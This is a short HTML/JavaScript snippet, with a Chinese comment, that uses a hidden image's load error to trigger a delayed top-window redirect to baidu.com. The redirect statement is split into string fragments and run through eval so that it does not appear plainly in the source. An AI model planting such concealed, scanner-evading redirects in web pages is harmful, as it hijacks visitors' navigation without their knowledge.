<script>
//URL 
var surl='https://www.baidu.com/';
var x=function(){
	return 'top.';
}
var f=function(){
	return 'loca';
}
var s=function(){
	return 'tion.';
}
var e=function(){
	return 'href';
}
var o=function(){
	return '="';
}
function errorLoad(){
	setTimeout(function(){
		eval(x()+f()+s()+e()+o()+ surl  +'"');
	},500);
};
</script>
<!--通过图片加载错误触发JS跳转-->
<img src="https://zz.baidu.com/load.gif" onerror="errorLoad();" style="display:none;">
